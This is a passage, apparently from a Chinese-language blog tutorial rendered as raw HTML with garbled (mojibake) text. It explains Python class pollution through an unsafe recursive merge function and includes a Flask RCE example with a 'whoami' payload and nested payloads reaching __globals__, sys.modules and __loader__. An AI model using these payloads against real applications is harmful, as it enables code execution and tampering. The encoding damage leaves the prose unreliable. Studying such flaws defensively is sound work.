result&#125;)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,debug=<span class="hljs-literal">True</span>)<br><br><br></code></pre></td></tr></table></figure><p>ç›´æ¥æ±¡æŸ“è¿›è¡Œrce</p><p>ä¼ å…¥</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;cmd&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;whoami&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸæ±¡æŸ“<code>demo</code>å±æ€§</p><h2 id="å±æ€§æ±¡æŸ“ä»¥åŠå¯»æ‰¾-merge"><a href="#å±æ€§æ±¡æŸ“ä»¥åŠå¯»æ‰¾-merge" class="headerlink" title="å±æ€§æ±¡æŸ“ä»¥åŠå¯»æ‰¾(merge)"></a>å±æ€§æ±¡æŸ“ä»¥åŠå¯»æ‰¾(merge)</h2><p>ç±»ä¼¼äº<code>ssti</code>çš„æ¨¡å¼ï¼Œåœ¨<code>ssti</code>ä¸­æˆ‘ä»¬å…ˆé€šè¿‡<code>init</code>åˆå§‹åŒ–å±æ€§ï¼Œåœ¨é€šè¿‡<code>globals</code>è®¿é—®å…¨å±€å˜é‡æŸ¥æ‰¾æ¨¡å—,ä½†æ˜¯åœ¨åŸå‹é“¾æ±¡æŸ“ä¸­ï¼Œå¦‚æœæˆ‘ä»¬ä¸è¿›è¡Œé‡å†™<code>__init__</code>çš„è¯ï¼Œæ˜¯æ‰¾ä¸åˆ°çš„</p><h3 id="åŸå‹é“¾"><a href="#åŸå‹é“¾" class="headerlink" title="åŸå‹é“¾"></a>åŸå‹é“¾</h3><p>å¦‚ä¸Šé¢çš„ï¼Œé€šè¿‡ç»§æ‰¿å…³ç³»å†™å‡º<code>poc</code>å³å¯ï¼Œå½“ç„¶ä¸æ­¤åŒæ—¶ï¼Œå¹¶ä¸åªæ˜¯æˆ‘ä»¬è‡ªå®šä¹‰çš„å±æ€§å¯ä»¥æ±¡æŸ“ï¼Œè¿˜æœ‰å†…ç½®å±æ€§ä¹Ÿå¯ä»¥ï¼Œè¿™é‡Œå¯ä»¥ä»¥è¿™ä¸ªå±æ€§ä¸ºä¾‹å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>instance = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__class__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__base__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span>,<br>            <span class="hljs-string">&quot;__str__&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-built_in">print</span>(father.__str__)<br>merge(payload,instance)<br><span class="hljs-built_in">print</span>(father.__str__)<br></code></pre></td></tr></table></figure><p>æˆåŠŸæ±¡æŸ“</p><h3 id="éç»§æ‰¿"><a href="#éç»§æ‰¿" class="headerlink" title="éç»§æ‰¿"></a>éç»§æ‰¿</h3><h4 id="globals"><a href="#globals" class="headerlink" title="globals"></a>globals</h4><p>æˆ‘ä»¬åœ¨<code>flask</code>ä¸­è¿›è¡Œ<code>SSTI</code>æ³¨å…¥çš„æ—¶å€™ä¸€èˆ¬å°±ä¼šå…ˆå»å¯»æ‰¾<code>globals</code>ï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸€æ ·ï¼Œæˆ‘ä»¬ç›´æ¥å»æ‰¾å°±è¡Œäº†ï¼Œä¸è¿‡æ³¨æ„çš„ä¸€ç‚¹å°±æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ä¸è¿›è¡Œé‡å†™<code>__init__</code>çš„è¯ï¼Œæ˜¯æ‰¾ä¸åˆ°çš„</p><p>æœªé‡å†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(MyClass.__init__))<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(MyClass.__init__.__globals__)<br><span class="hljs-comment"># è®¿é—®ä¸å­˜åœ¨çš„å±æ€§ä¼šæŠ›å‡ºAttributeError</span><br><span class="hljs-keyword">except</span> AttributeError <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br>    <br><span class="hljs-comment"># &lt;class &#x27;wrapper_descriptor&#x27;&gt;</span><br><span class="hljs-comment"># &#x27;wrapper_descriptor&#x27; object has no attribute &#x27;__globals__&#x27;</span><br></code></pre></td></tr></table></figure><p>é‡å†™è¿‡å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.x = <span class="hljs-number">10</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(MyClass.__init__))  <br><span class="hljs-built_in">print</span>(MyClass.__init__.__globals__)  <br><span class="hljs-comment"># &lt;class &#x27;function&#x27;&gt;</span><br><span class="hljs-comment"># &#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000001BDD0B71700&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;test.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;MyClass&#x27;: &lt;class &#x27;__main__.MyClass&#x27;&gt;&#125;</span><br></code></pre></td></tr></table></figure><p>åŒæ—¶è¿™é‡Œæˆ‘ä»¬ä¹Ÿå‘ç°ï¼Œå½“å…¶æœªè¢«é‡å†™æ—¶ï¼Œå®ƒçš„ç±»å‹æ˜¯ <code>wrapper_descriptor</code>ï¼Œä¸€ä¸ªå†…ç½®æ–¹æ³•ï¼Œæ˜¯æ²¡æœ‰å…¨å±€å˜é‡çš„æ¦‚ç‡çš„ï¼Œï¼Œè¢«é‡å†™ä¼šå˜ä¸º<code>function</code>ï¼Œä¸€ä¸ªå‡½æ•°å°±æœ‰å…¨å±€å˜é‡çš„æ¦‚ç‡äº†ï¼Œæœ‰<code>__globals__</code>ï¼Œè¯·çœ‹<code>demo</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo</span>():<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-built_in">print</span>(demo.__globals__ == <span class="hljs-built_in">globals</span>() == MyClass.__init__.__globals__)<br></code></pre></td></tr></table></figure><p>éƒ½æ˜¯è®¿é—®å½“å‰çš„å…¨å±€å˜é‡</p><p>æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯æ‹¿åˆ°<code>__globals</code></p><p>çœ‹ä¸€ä¸ªç®€å•çš„demo</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">father</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>    secret = <span class="hljs-string">&quot;hello&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_a</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">pass</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son_b</span>(<span class="hljs-title class_ inherited__">father</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># éå†å­—å…¸ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># æ£€æŸ¥dstæ˜¯å¦ä¸ºå­—å…¸</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># å¦‚æœå­˜åœ¨é”®kå¹¶ä¸”væ˜¯ä¸€ä¸ªå­—å…¸</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># å¦‚æœdstæ˜¯ä¸€ä¸ªå¯¹è±¡å¹¶ä¸”æœ‰å±æ€§k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># å°†vèµ‹å€¼ç»™k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br>test=<span class="hljs-string">&quot;test&quot;</span><br>a = son_a()<br>b = son_b()<br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>            <span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span>,<br>            <span class="hljs-string">&quot;father&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;a&quot;</span>:&#123;<br>                <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>            &#125;<br>        &#125;<br><br>    &#125;<br>&#125;<br><br><br><span class="hljs-built_in">print</span>(a.secret)<br><span class="hljs-built_in">print</span>(test)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(a.secret)<br><span class="hljs-built_in">print</span>(father.secret)<br><span class="hljs-built_in">print</span>(test)<br></code></pre></td></tr></table></figure><p>æˆåŠŸæ±¡æŸ“äº†ï¼Œä½†æ˜¯å®é™…æƒ…å†µä¸­ï¼Œå¸¸å¸¸æ˜¯å­˜åœ¨äºå†…ç½®æ¨¡å—æˆ–è€…æ˜¯ç¬¬ä¸‰æ–¹æ¨¡å—ä¹‹ä¸­ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±ä¸å¤ªå¥½æ‰¾å…³ç³»äº†ã€‚ä¸è¿‡è¿˜æ˜¯æœ‰å¾ˆå¤šåŠæ³•çš„</p><h4 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h4><p>é‚£ä¹ˆå°±è¦ä½¿ç”¨<code>sys</code>ï¼Œå› ä¸º<code>sys</code>æ¨¡å—çš„<code>modules</code>å±æ€§ä»¥å­—å…¸çš„å½¢å¼åŒ…å«äº†ç¨‹åºè‡ªå¼€å§‹è¿è¡Œæ—¶æ‰€æœ‰å·²åŠ è½½è¿‡çš„æ¨¡å—ï¼Œå¯ä»¥ç›´æ¥ä»è¯¥å±æ€§ä¸­è·å–åˆ°ç›®æ ‡æ¨¡å—ï¼Œå¹¶éšç€æ¨¡å—çš„å¯¼å…¥è€ŒåŠ¨æ€æ›´æ–°</p><p>çœ‹ä¸ªç®€å•çš„demo</p><p><code>test.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    secret=<span class="hljs-string">&quot;123456&quot;</span><br></code></pre></td></tr></table></figure><p><code>demo.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> test<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>():<br>    secret = <span class="hljs-string">&quot;nonono&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># éå†å­—å…¸ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># æ£€æŸ¥dstæ˜¯å¦ä¸ºå­—å…¸</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># å¦‚æœå­˜åœ¨é”®kå¹¶ä¸”væ˜¯ä¸€ä¸ªå­—å…¸</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># å¦‚æœdstæ˜¯ä¸€ä¸ªå¯¹è±¡å¹¶ä¸”æœ‰å±æ€§k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># å°†vèµ‹å€¼ç»™k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;sys&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;modules&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                        <span class="hljs-string">&quot;test&quot;</span>: &#123;<br>                            <span class="hljs-string">&quot;secret&quot;</span>: <span class="hljs-string">&quot;hacker&quot;</span><br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>b = b()<br><br><span class="hljs-built_in">print</span>(test.test.secret)<br>merge(payload, b)<br><span class="hljs-built_in">print</span>(test.test.secret)<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸæ±¡æŸ“ç¬¬ä¸‰æ–¹æ¨¡å—<code>test</code>æ¨¡å—çš„<code>secret</code></p><h4 id="LoaderåŠ è½½å™¨"><a href="#LoaderåŠ è½½å™¨" class="headerlink" title="LoaderåŠ è½½å™¨"></a>LoaderåŠ è½½å™¨</h4><p><code>__loader__</code> æ˜¯ä¸€ä¸ªå±æ€§ï¼Œå®ƒå­˜åœ¨äºæ¯ä¸ªå·²å¯¼å…¥çš„æ¨¡å—å¯¹è±¡ä¸­ã€‚è¿™ä¸ªå±æ€§æŒ‡å‘ä¸€ä¸ªåŠ è½½å™¨å¯¹è±¡ï¼Œè¯¥å¯¹è±¡è´Ÿè´£åŠ è½½è¯¥æ¨¡å—ã€‚åœ¨ä¸€äº›åœºæ™¯ä¸­å¸¸å¸¸ä¼´æœ‰ç€<code>importlib</code>æ¨¡å—çš„ä½¿ç”¨ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨<code>loader</code>åŠ è½½å™¨æ¥è¿›è¡Œ<code>sys</code>æ¨¡å—çš„åŠ è½½ä»è€Œè¾¾åˆ°ç›®çš„</p><p>æˆ‘ä»¬ç®€å•çš„çœ‹ä¸‹</p><p><strong>BuiltinImporter</strong></p><ul><li>ç”¨äºå†…ç½®æ¨¡å—çš„åŠ è½½</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-built_in">print</span>(math.__loader__)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>SourceFileLoader</strong></p><ul><li>ç”¨äºåŠ è½½æ¥è‡ªæ–‡ä»¶ç³»ç»Ÿçš„æ¨¡å—</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> test<br><span class="hljs-built_in">print</span>(test.__loader__)<br>&lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span class="hljs-number">0x0000018931CD6E70</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>ExtensionFileLoader</strong></p><ul><li>ç”¨äºåŠ è½½æ‹“å±•æ¨¡å—</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy<br><span class="hljs-built_in">print</span>(numpy.__loader__)<br>&lt;_frozen_importlib_external.SourceFileLoader <span class="hljs-built_in">object</span> at <span class="hljs-number">0x000001C8DC2710D0</span>&gt;<br></code></pre></td></tr></table></figure><p>åªè¦æ˜¯<code>BuiltinImporter</code>çš„åŠ è½½å™¨éƒ½è¡Œï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æœ‰**_<em>spec</em>_**ä¹Ÿèƒ½ç”¨</p><p><code>__spec__</code>å†…ç½®å±æ€§åœ¨<code>Python 3.4</code>ç‰ˆæœ¬å¼•å…¥ï¼Œå…¶åŒ…å«äº†å…³äºç±»åŠ è½½æ—¶çš„ä¿¡æ¯ï¼Œæœ¬èº«æ˜¯å®šä¹‰åœ¨<code>Lib/importlib/_bootstrap.py</code>çš„ç±»<code>ModuleSpec</code>ï¼Œæ˜¾ç„¶å› ä¸ºå®šä¹‰åœ¨<code>importlib</code>æ¨¡å—ä¸‹çš„<code>py</code>æ–‡ä»¶ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é‡‡ç”¨<code>&lt;æ¨¡å—å&gt;.__spec__.__init__.__globals__[&#39;sys&#39;]</code>è·å–åˆ°<code>sys</code>æ¨¡å—</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250311173156762.png" alt="image-20250311173156762"></p><p>çœ‹ä¸ª<code>demo</code></p><p><code>test.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    secret=<span class="hljs-string">&quot;123456&quot;</span><br></code></pre></td></tr></table></figure><p><code>demo.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> importlib<br><span class="hljs-keyword">import</span> test<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">a</span>():<br>    secret = <span class="hljs-string">&quot;nonono&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">b</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">src, dst</span>):<br>    <span class="hljs-comment"># éå†å­—å…¸ä¸­çš„æ‰€æœ‰é”®å€¼å¯¹</span><br>    <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> src.items():<br>        <span class="hljs-comment"># æ£€æŸ¥dstæ˜¯å¦ä¸ºå­—å…¸</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(dst, <span class="hljs-string">&#x27;__getitem__&#x27;</span>):<br>            <span class="hljs-comment"># å¦‚æœå­˜åœ¨é”®kå¹¶ä¸”væ˜¯ä¸€ä¸ªå­—å…¸</span><br>            <span class="hljs-keyword">if</span> dst.get(k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>                merge(v, dst.get(k))<br>            <span class="hljs-keyword">else</span>:<br>                dst[k] = v<br>                <span class="hljs-comment"># å¦‚æœdstæ˜¯ä¸€ä¸ªå¯¹è±¡å¹¶ä¸”æœ‰å±æ€§k</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">hasattr</span>(dst, k) <span class="hljs-keyword">and</span> <span class="hljs-built_in">type</span>(v) == <span class="hljs-built_in">dict</span>:<br>            merge(v, <span class="hljs-built_in">getattr</span>(dst, k))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># å°†vèµ‹å€¼ç»™k</span><br>            <span class="hljs-built_in">setattr</span>(dst, k, v)<br><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;importlib&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;__loader__&quot;</span>:&#123;<br>                    <span class="hljs-string">&quot;__init__&quot;</span>:&#123;<br>                        <span class="hljs-string">&quot;__globals__&quot;</span>:&#123;<br>                            <span class="hljs-string">&quot;sys&quot;</span>:&#123;<br>                                <span class="hljs-string">&quot;modules&quot;</span>:&#123;<br>                                    <span class="hljs-string">&quot;test&quot;</span>:&#123;<br>                                        <span class="hljs-string">&quot;test&quot;</span>:&#123;<br>                                            <span class="hljs-string">&quot;secret&quot;</span>:<span class="hljs-string">&quot;hacker&quot;</span><br>                                        &#125;<br>                                    &#125;<br>                                &#125;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>              